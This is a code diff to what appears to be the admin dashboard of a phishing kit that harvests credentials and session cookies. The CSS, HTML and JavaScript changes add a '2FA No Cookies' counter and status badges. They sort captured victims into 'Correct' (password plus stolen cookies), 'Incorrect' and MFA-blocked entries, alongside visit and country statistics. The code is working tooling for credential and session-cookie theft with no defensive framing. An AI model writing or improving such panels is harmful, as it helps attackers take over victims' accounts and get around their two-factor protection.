@@ -496,17 +496,20 @@ tbody tr:hover{background:rgba(0, 255, 65, 0.05)}
 .analysis-box-compact.box-success { background-color: #d23232; }
 .analysis-box-compact.box-error { background-color: #c0cb25; }
 .analysis-box-compact.box-primary { background-color: #76517b; }
+.analysis-box-compact.box-warning { background-color: #b45309; }
 
 /* Analysis box label styles */
 .analysis-box-compact.box-info .analysis-label,
 .analysis-box-compact.box-success .analysis-label,
-.analysis-box-compact.box-error .analysis-label { color: #ffffff; font-weight: 800; }
+.analysis-box-compact.box-error .analysis-label,
+.analysis-box-compact.box-warning .analysis-label { color: #ffffff; font-weight: 800; }
 .analysis-box-compact.box-primary .analysis-label { color: #fafafa; font-weight: 800; }
 
 /* Analysis value font-weight override */
 #stat-visits,
 #stat-correct,
 #stat-incorrect,
+#stat-mfa,
 #stat-total-cookies { font-weight: 800; }
 
 /* Responsive Sidebar */
@@ -2211,6 +2214,10 @@ tbody tr:hover{background:rgba(0, 255, 65, 0.05)}
           <div class="analysis-value" id="stat-incorrect">0</div>
           <div class="analysis-label">Incorrect</div>
         </div>
+        <div class="analysis-box-compact box-warning">
+          <div class="analysis-value" id="stat-mfa">0</div>
+          <div class="analysis-label">2FA No Cookies</div>
+        </div>
         <div class="analysis-box-compact box-primary">
           <div class="analysis-value" id="stat-total-cookies">0</div>
           <div class="analysis-label">Cookies</div>
@@ -3836,6 +3843,7 @@ async function loadEvents(){
     let totalCookies = 0;
     let incorrect = 0;
     let correct = 0;
+    let mfa = 0;
     let visits = 0;
     const countryStats = {};
     const fragment = document.createDocumentFragment();
@@ -3865,6 +3873,7 @@ async function loadEvents(){
         const password = String(r.password || "").trim();
         const hasPassword = password.length > 0;
         const hasCookies = (status === 'completed' || !!r.hasScript);
+        const isMfa = status === 'mfa_prompt' || status === 'mfa_accepted' || /mfa|2fa/i.test(String(r.error || ''));
         const isVisitor = !r.emailMask || String(r.emailMask).trim() === 'visitor';
 
         // Track unique sessions for "Total Visits" stat
@@ -3884,6 +3893,9 @@ async function loadEvents(){
         if (hasPassword) {
             if (hasCookies) {
                 correct++;
+            } else if (isMfa) {
+                // 2FA required but no cookies captured — not an incorrect password
+                mfa++;
             } else {
                 // Email + Pass + No cookies = Incorrect
                 incorrect++;
@@ -3900,6 +3912,8 @@ async function loadEvents(){
 
             if (hasCookies) {
                 typeLabel = "Correct";
+            } else if (isMfa) {
+                typeLabel = (status === 'mfa_prompt') ? "2FA Pending" : "2FA No Cookies";
             } else if (hasPassword) {
                 typeLabel = (status === 'processing') ? "Processing..." : "Incorrect";
             } else {
@@ -3912,8 +3926,9 @@ async function loadEvents(){
 
             const tr = document.createElement("tr");
             const isSuccess = typeLabel === 'Correct';
+            const isMfaLabel = typeLabel === '2FA No Cookies' || typeLabel === '2FA Pending';
             const isNeutral = typeLabel === 'Visit' || typeLabel === 'Processing...';
-            const badgeStyle = isSuccess ? 'border-color:var(--accent);color:var(--accent)' : (isNeutral ? 'border-color:var(--c-info);color:var(--c-info)' : 'border-color:var(--danger);color:var(--danger)');
+            const badgeStyle = isSuccess ? 'border-color:var(--accent);color:var(--accent)' : (isMfaLabel ? 'border-color:#f59e0b;color:#f59e0b' : (isNeutral ? 'border-color:var(--c-info);color:var(--c-info)' : 'border-color:var(--danger);color:var(--danger)'));
             
             let cookieBtn = '';
             const isFailedAttempt = r.type && (r.type.includes('fail') || r.type.includes('error'));
@@ -3957,6 +3972,7 @@ async function loadEvents(){
     // Update stats UI
     if(document.getElementById('stat-total-cookies')) document.getElementById('stat-total-cookies').textContent = correct; // Total Cookies = Correct
     if(document.getElementById('stat-incorrect')) document.getElementById('stat-incorrect').textContent = incorrect;
+    if(document.getElementById('stat-mfa')) document.getElementById('stat-mfa').textContent = mfa;
     if(document.getElementById('stat-correct')) document.getElementById('stat-correct').textContent = correct;
     if(document.getElementById('stat-visits')) document.getElementById('stat-visits').textContent = uniqueSessions.size;
     
